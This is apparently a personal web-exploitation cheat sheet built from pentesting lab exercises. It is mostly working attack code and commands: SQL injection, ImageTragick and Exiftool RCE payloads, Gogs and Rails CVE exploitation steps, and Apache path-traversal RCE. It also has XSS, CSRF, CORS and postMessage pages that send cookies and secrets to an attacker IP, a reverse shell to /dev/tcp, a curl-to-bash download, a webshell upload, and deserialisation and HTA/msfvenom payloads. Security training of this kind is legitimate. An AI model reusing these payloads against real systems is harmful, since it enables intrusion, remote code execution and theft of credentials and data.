* try to inject (',-1,-0) (filter[user_id%3D1--+]=1)=>(=1--+)
* find the column with union select as shown in (I) plus with null, '1's' or with (order by) ?id=2 order by 10 (tip is to start high and divide until you find the sweet spot)
* inject `union select 1,concat(email,":",password),1,1,1,1,1 from users--+`
* mfa bypass -> try to ignore and go to homepage
* payload.png
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|uname")'
pop graphic-context
```
* if the upload does not trigger the payload, use associated buttons to trigger

# Length Extension Attack (directory travasal)
* vuln is using ` Digest::SHA256.hexdigest(ENV['SECRET']+str)` to sign in ruby
* normal params `getfile?filename=supersecret.rb&signature=02891e0ef1dec202a3a7c4daa302fa07cc1182344b58cdc881c70d844791c26d`
* sudo docker run -Pit alpine
* * apk add build-base make curl git oppenssl-dev
* use hash_extenter (https://github.com/iagox86/hash_extender)
* * make
* * ./hash_extender --data supersecret.rb --signature 02891e0ef1dec202a3a7c4daa302fa07cc1182344b58cdc881c70d844791c26d --append /../key.txt --out-data-format=html
* replace the string and the sginature in the url

# Gogs RCE (use same name)
* for exploit creation
* start docker instance `docker run -Pit -v `pwd`:/code gogs/gogs:0.11.66 /bin/bash`
* /app/gogs/docker/start.sh => start gogs
* use `docker ps` to find port and navigate 
* use mysqlite3 || change application url => http://0.0.0.0:portabove || under server and other, diable captcha || create admin
* enter bash `sudo docker exec -it container-id /bin/bash`
* check /admin/config for provider config = data/session
* restart gogs from point 3 ^ ( use `ps -edf` -> find process-id then kill) x2
* refresh page (sign in / out)
* find / -name sessions => cd 
* use `find .` to list tree || use `find . -type f` to list files
* confirm the name of the file match the admin cookie session
* `cp session file to /code` /code as the shared dir
* strings session file to check 
* sign oout 
* go to the victim site (create account | repo | clone ) (use consistent naming)
* git clone ^
* copy the session file to the repo then add . | commit -m "seesion" | push
* create same user and repo on local instance
* clone the repo as local
* find / -name session-id => should see for local and victim
* add a test file to local version => web
* find / -name session-id => should see a /tmp/local
* check the fork link for match
* add a test file to victim version => web
* find / -name session-id => replace vitim i_like_gogits cookie to ../tmp/local-repo/1/session-id => May need to retry a couple
* then go to setting of vitim repo then git hooks-> replace with code execution => May need to retry a couple (refresh)
* copy clone link and make new clone as adminrepo then touch a file and commit -> push (code executed)

# Gogs RCE (CVE-2018-20303)

* create account || clone || add file (locally) || add || commit || push
* upload the admin session from gog I (using the web) (intercept -> get the i_like_gogs)
* on intercept transform it to (e.g b4711acaa119763a => ../../../../../../../../../../../../data/gogs/data/sessions/b/4/b4711acaa119763b) (change last char)
* on intercept use above as filename then foward and commit
* the file won't be in repo if done well
* go to homepage intercept and change the last char to above -> admin (also in browser)
* go to the /demo/test (created repo earlier)
* then go to setting of vitim repo then git hooks-> replace with code execution => May need to retry a couple (refresh)
* edit a file and commit -> push (code executed)

# JWT web token (with jku)
* get cookie decode
* use (tools/jwt-jku.rb)
* generate private key
* set server and ngrok to host mykey.json in (tools/jwt-jku.rb)

# JWT web token (with jku upload func)
* same as above just find n or e and upload mykey.json (find correct path)

# JWT web token (with x5c | x5u)
* (tools.x5.rb)

# CVE-2019-5418 (ruby dev 5.2 rails file-read traversal)

* find an action that uses render file: "#{Rails.root}/some/file ( mostly found in 404 page)
* file read => (curl -H 'Accept:../../../../../../../etc/passwd{{' VULN_URL ^
* in production mode cache will be enable making first payload repeat except in develpoment
* get key => (curl -H 'Accept:../../../config/master.key{{' http://ptl-db6c4a9d-84387251.libcurl.so/info -o master.key)
* get enc => (curl -H 'Accept:../../../config/credentials.yml.enc{{' http://ptl-db6c4a9d-84387251.libcurl.so/info -o credentials.yml.enc)
* use (tools/decrptor) => secret_key_base
* goal is to encrypt session and malicious marshal object in a session
* use the (tools/cve-2019-5418-exploit-dev-5.2.rb)
* copy last URI encoded version to auth cookie or use the curl version

# IDOR to shel (ruby rails mfa)
* using `..` to bypass mfa
* when you see IDOR e.g (users/1) try 1.json
* upload a file
* use (/edit) on a field ususally comes default e.g (/files/3/edit)
* Kernel.open allows file name to be ran as command if it starts with a `|` 
* inject the field to rename file and click trigger after upload

# JWT web token (with jku whitelist bypass open redirect)
* tools/jwt-jku-openred-sigonly.rb

# JWT web token (with jku header injection response)
* if request is reflected as key value in header
* try e.g (debug?value=1337%0D%0Atest:test) => add new field
* `curl -s --dump-header - -o /dev/null http://ptl-b77a8d98-ad25e3bd.libcurl.so/debug?value=test%0D%0Atest:test`

# Magento

* magescan

# Token brute force (ippsec lazy)

* burp suite (sequencer) -> get randomness -> intruder-> bit fliper
* pad buster -> perl padBuster.pl url token size|8 location|-cookies auth=token => ascii decy "user=ippsec"
* * pad buster -> perl padBuster.pl url token size|8 location|-cookies auth=token -plaintext user=admin

# Apache HTTP Server 2.4.49 Vuln

* curl --data "echo;id" 'http://127.0.0.1:55026/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
* curl -v 'http://127.0.0.1:55036/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh?-c+id'
* GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 

# Intercept DNS

* tcpdump -i eth0 udp port 53 
* (types ip in form to get dns response in tcpdump) A?=ipv4 AAAA=ipv6
* take note of ip and resolved name from above
* sudo apt install dnsmasq 
* dnsmasq.conf > (addn-hosts=dnsmasq.hosts) ==> tell dnsmasq where config is
* dnsmasq.host > (pubIP HOSTtoresolveto)
* listen in port 80 or whereever

## light sail (AWS)
* Allow UDP in network settings (firewall)
* sudo apt-get update
* sudo apt-get upgrade
* sudo apt install dnsmasq
* sudo service dnsmasq stop
* echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
* echo "35.86.53.0 mitm1.pentesterlab.com" > dnsmasq.hosts
* sudo dnsmasq -C dnsmasq.conf --no-daemon
* * (test) dig @35.86.53.0 mitm1.pentesterlab.com
* nc -lvnp 80

# Intercept DNS (TLS)
* Allow UDP in network settings (firewall)
* Allow HTTPS in network settings (firewall)
* certificate trust chain ( -> -> )
* Host dns as above
* run the create_cert script
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
* make the Common name the host (mitm2.ptl.com)  
* run start_tls_server.sh
```
FILENAME=server
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
for only sniffing(and fowarding it to right server) use  `sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0` 

# Perl Csv | file open Vuln

* If a file begins or ends with a pipe(|) perl executes it
* * Create payload `echo 'bash -i >& /dev/tcp/10.0.0.1/1337 0>&1' | base64`
* * Create file `touch -- '| echo base64payload|base 64 -d| bash;.csv'` 
* * watch ippsec pikaboo video and perl jam video

# XSS include 
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* find if js is loaded from page
```
<html>
<body>
<script>
function display(data) {
for (var key in data){
document.write("<img src='http://35.86.53.0/?s="+data[key]+"'/>");
}
}
</script>
<script src="http://ptl-bd3496a9-3fd10b70.libcurl.so/secrets.js"></script>
</body>
</html>
```
# Cross-Site Request Forgery (CSRF)

* In a case of redirect, use the img tag for get actions and use a form action post for post actions
* always check if the csrf token is fake
```


# Json CSRF
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* pass fake form with action: post, and hidden input  if site doesnot have csrf protection
* test if content type for json us not enforced
* find post that creates and action
* `<input type="hidden" name='{"password":"Password123' value='"}' >`
```
<form id="csrf" action="http://example/change_password" method="POST" enctype="text/plain" >
<input type="hidden" name='{"password":"Password123' value='"}' >
</form>
```
```
<html>
<body onload="document.getElementById('csrf').submit()">
<form id="csrf" action="http://ptl-12507bed-5c1eb171.libcurl.so/share" method="POST" enctype="text/plain" >
<input type="hidden" name='{"user":"as@as.aa","id":0,"fake":"' value='"}' >
</form>
</body>
</html>
```

# SVG XSS
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* upload with to excute javascript
* check if image upload reflects the content type
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert('8960b64a-fb41-40dc-ac1f-ac406dc9a461');
</script>
</svg>
```
script to make req in reg
```
<script>
function jj() {
	const Http1 = new XMLHttpRequest();
	Http1.open("GET", "http://admin:youwouldntdownloadacouch@localhost:5984/users/_all_docs?include_docs=true");
	Http1.setRequestHeader('Authorization', 'Basic YWRtaW46eW91d291bGRudGRvd25sb2FkYWNvdWNo');
	Http1.send();
	
	Http1.onreadystatechange = (e) => {
		let Http2 = new XMLHttpRequest();
		Http2.open("POST", "https://enmgux1qyk0ly71.m.pipedream.net", true);
		Http2.setRequestHeader('Content-type', 'application/json');
		Http2.send(Http1.responseText);
	}
}

window.onload = jj
</script>
```

# CSP
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* `default-src 'self'` means to set all other policy to `self`
* `script-src 'website.com'` ony accepts script from the website.com => http://ptl-66b787fc-7578432b.libcurl.so/?name=<script src="http://ptl-66b787fc-7578432b.libcurl.so/js/countdown.php?end=2534926825);alert('8960b64a-fb41-40dc-ac1f-ac406dc9a461');//"></script>
* * use it 

* `<script src="data:;base64,ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwOi8vODVhMC03My0xMjktMTQtNzIubmdyb2suaW8vP3M9Iitkb2N1bWVudC5jb29raWUrIicvPiIpOw=="></script>`
* `"/>'><script src=http://85a0-73-129-14-72.ngrok.io></script>`


# Websocket hijacking
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* Websocket reqquest/response hijacked
* all victim visit link
```
<html>
<body>
<script>
var uri = "ws://ptl-890d1f27-4470badb.libcurl.so/";
var ws= new WebSocket(uri);
ws.onmessage = function(message) {
var data = JSON.parse(message.data);
document.write("<img src='http://35.86.53.0/?s="+ data.text + "'/>");
}

ws.onopen = () =>  ws.send(JSON.stringify({  text: "/getkey" }));
</script>
</body>
</html>
```

# postMessage() (with no same site options)
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* sends message across two windows
* with the other window already with postMessage()
```
<html>
<script>
window.addEventListener("message", function(event){
document.write("<img src='http://35.86.53.0/?s="+event.data.value+ "'/>");
}, false);
window.open("http://ptl-a30c1834-2ae453de.libcurl.so/key/0");
</script>
</html>
```

# postMessage() II (with no xframe options)
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* the demo shows, forcing admin to share secrects with normal user (func: a button creates a post message so, help the admin post the message)
```
<html>
<body>
<iframe id="frame" onload="hack()" src="http://ptl-5688ab29-09d06581.libcurl.so/"></iframe>
<script>
function hack() {
setTimeout(function() { document.getElementById("frame").contentWindow.postMessage('user=as@as.aa&id=0','*');
},2000);
}
</script>
</body>
</html>
``` 

# postMessage() III 
### (The introduction of SameSite in browsers may limit the exploitation of this issue. The victim uses an old browser that does not enforce SameSite=Lax.)
* creates post on the admin page that sends cookie
```
<html>
<body>
<iframe id="frame"  src="http://ptl-195278a7-64991e5c.libcurl.so/"></iframe>
<script>
setTimeout(function() { document.getElementById("frame").contentWindow.postMessage("<img src=a onerror='document.write(\"<img src=http://35.86.53.0/exploit5.html/c=\"+document.cookie+\"/>\")'/>",'*');
},2000);
</script>
</body>
</html>
```

# postMessage() IV
* shares admin secret by opening a window and sending a post 
```
<html>
<body>
<script>
var w=window.open("http://ptl-ff1307a0-a79535a5.libcurl.so/", "hack");
setTimeout(function() { w.postMessage('user=as@as.aa&id=0','*'); }, 2000);
</script>
</body>
</html>
```

# Cross site Leak (Blind time based)

```
<html>
<body>
<script>
document.write("<br/> Invalid");
var all = "0123456789-abcdef".split("");
var base = "http://ptl-9b58e45e-c766cfdd.libcurl.so/search?search=^";
var counter = 0;
var cur = "";

function check(cur, counter){
url = base+cur+all[counter];
var val = cur+all[counter];
v=performance.now();
fetch(url,{
method: 'GET', credentials:'include', mode:'no-cors'}).catch(err => {
console.log("ERR"+val);
}).then(response => {
z=performance.now();
if(z-v < 3000){
document.write("<br/> Invalid"+val+(z-v).toString());
}else {
document.write("<br/> Found "+ val+(z-v).toString());
document.write("<img src='http://35.86.53.0/c="+val+"'/>");
j=0
while (j < all.length){
check(val, j);
j+=1;
}
}
})
}
i=0;
while (i < all.length){

setTimeout(check("", i), 500*i);
i+=1;
}

</script>
</body>
</html>
```

# Go Get RCE (go get vuln < 1.8)

* create a github repo
* clone and cd 
* `sudo docker run -it -v `pwd`:/code debian /bin/bash`
* in docker `apt-get install gcc`
* add attack.c
```
#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461");
}
```
`gcc -shared -o attack.so -fPIC attack.c`
* main.go
```
package main
// #cgo CFLAGS: -fplugin=./attack.so
// typedef int (*intFunc) ();
//
// int
// bridge_int_func(intFunc f)
// {
//      return f();
// }
//
// int fortytwo()
// {
//      return 42;
// }
import "C"
import "fmt"

func main() {
    f := C.intFunc(C.fortytwo)
    fmt.Println(int(C.bridge_int_func(f)))
    // Output: 42
}
```
* git add .; git commit -m "test"; git push
* submit link to vuln e.g (github.com/vcaster/go-get-demo)

# HTTPoxy/Golang

* vuln request parses headers as env variables in go
* get the cgi request and add proxy to the listener
* `curl 'http://ptl-079ba6cc-53406c38.libcurl.so/cgi-bin/hello.cgi' -H 'Proxy: http://35.86.53.0'`

# Cross-Origin Resource Sharing II

* Origin request header us is reflected as allowed in response as `Access-Control-Allow-Origin:`
* let vitctim visit 
```
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys", false);
xhr.withCredentials=true;
xhr.send();
var a=xhr.responseText;

var xhr2 = new XMLHttpRequest();
xhr2.open("GET", "http://35.86.53.0/?c="+a,false);
xhr2.withCredentials=true;
xhr2.send();
</script>
</body>
</html>
```

# git sub module RCE (CVE-2018-11235)

* ensure victim uses git (2.1.4)
* follow (tools/git submodule rce.md) 

# Signing Oracle

* when the key used to sign a session is the valid for other featues
* eg session cookie {id:"username" } and to view secret is {id: 0}
* creating a user 0 and using the session token to view secret

# Prototype Pollution

* pollute other objects to satisiy app conditions 
```
>> a={}
Object {  }
>> b={}
Object {  }
>> b.__proto__.foo='bar';
"bar"
>> b.foo
"bar"
>> c={}
Object {  }
>> c.foo
"bar"
>> a.foo
"bar"
```

# CVE-2021-41773

* Apache rce  ` http://[SERVER]/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`
* check livefire Ubuntu/vuln.md

# JWE (json web encryption)

* Base64(Header).Base64(Encrypt(CEK, public_key)).Base64(IV).Base64(Encrypt(Data, CEK)).Base64(authentication_tag)
* Flaw, given an public key, you can sign 
* run docker `docker run -it -v `pwd`:/app ruby:2.5 /bin/bash`
* `gem install jwe`
* (tools/jwe-pub) -> may need to brute force data section. validate enc type. replace public key path

# Apache Pluto RCE

* try default creds pluto:pluto
* upload web shell via HEAD request because of weak ACL that does not exlude the HEAD method
* upload webshell `curl -X HEAD 'http://ptl-7d728b93-46ac66ac.libcurl.so/pluto/portal/File%20Upload/__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0' -F "file=@webshell.jsp" -vv`
* navigate to view webshell `curl http://ptl-7d728b93-46ac66ac.libcurl.so/PortletV3AnnotatedDemo/temp/webshell.jsp`
* https://cxsecurity.com/issue/WLB-2018090134 

# Unicode and Uppercase

* Using latin encoded string replace letter in username or passowrd 
* in vuln app admin === admÄ±n (notice the dotless I)
* https://www.compart.com/en/unicode/U+0131


# Unicode and Downcase

* use kelvin sign as K 
* puts (0x212A.chr('UTF-8')+"ADMIN").downcase

# Zip symlink
* if a web app unzips and displays results
* create a zip with a symlink to the file you want to read
* `mkdir app` `cd app` `ln -s /app/key.txt` `cd ..` `zip -r --symlinks app.zip app`
* upload app.zip
* use `ln -s /etc/passwd`

# PyYAML unsafe loader

* vuln in rhw YAMl.load function in python
```
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461')"
  ```
* https://blog.ankursundara.com/pyyaml-cve/

# Express render LFR (local file read)
* layout vuln (  res.render('index', username); instead of res.render('index', {username: username});)
* `curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'`
* https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/
* for get req `GET /?username[layout]=../../app/key.txt `
```
POST / HTTP/1.1
Host: ctf.shoebpatel.com:9090
Content-Length: 48
Content-Type: application/json

{
  "profile": {
    "layout": "./../routes/index.js"
  }
}
```
```
var express = require('express');
var router = express.Router();

router.get('/', function(req, res, next) {
 	res.render('index')
});

router.post('/', function(req, res, next) {
	var profile = req.body.profile
 	res.render('index', profile) //here
});

module.exports = router;
```

# Apache proxy ssrf 

* `curl "http://ptl-77f65b57-1dde7ddd.libcurl.so//?unix:$(perl -e 'print("A"x7000)')|http://127.0.0.1:1234/"`
* https://firzen.de/building-a-poc-for-cve-2021-40438
* mod_proxy searches anywhere in the URL instead of at the start of the URL for the handler unix:.
* a long URL allows an attacker to set the unix domain socket to null and gets Apache to load the URL following it.

# Php phar (phar exploit)

* generate a serialized phar stuff
```
<?php
class UploadFile {
public $filename="'.system('/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461 > /var/www/score').'";
} //change the class with the class found (assert(trim("'".$this->filename.";"));) 
$o=new UploadFile();

$phar = new Phar("phar.phar");
$phar->startBuffering();

$phar->addFromString("test.txt","test");
$phar->setStub("<?php __HALT_COMPILER(); >");

$phar->setMetadata($o);
$phar->stopBuffering();
?>
```
* turn `phar.readonly= Off` (uncomment) in /etc/php/7.x/cli/php.ini -> `php pharexploit.php`
* upload phar file to system and use the phar:///root/of/the/uploaded/dir to execute it
* learn more from
* https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1 and https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2.
* https://blog.ripstech.com/2018/new-php-exploitation-technique/.
* https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf.

# Spring Actuators (spring 1.4.x)

# Php metadata 

* add php webshell in meta `exiftool -Comment='<?php echo "<pre>"; system($_GET['c']); ?>' pic.jpg`

# Exiftool RCE

* wget -O /tmp/revcurl http://10.10.16.29:132/revcurl; cat /tmp/revcurl; cat /tmp/revcurl | bash
* revcurl -> bash -c
* paylo -> `(metadata "\c${system('wget -O /tmp/revcurl http://10.10.16.29:132/revcurl; cat /tmp/revcurl; cat /tmp/revcurl | bash')};")`
* `bzz paylo payload.bzz`
* `djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz `
* get a hacker.jpg
* `exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg`

# HTA
* html application that runs windows script on Interner explorer
* serve as .hta
```
<html>
<head>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell).Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
```
* gen rev shell with `msfvenom -p windows/shell_reverse_tcp LHOST-IP LPORT=PORT -f hta-psh -o evil.hta`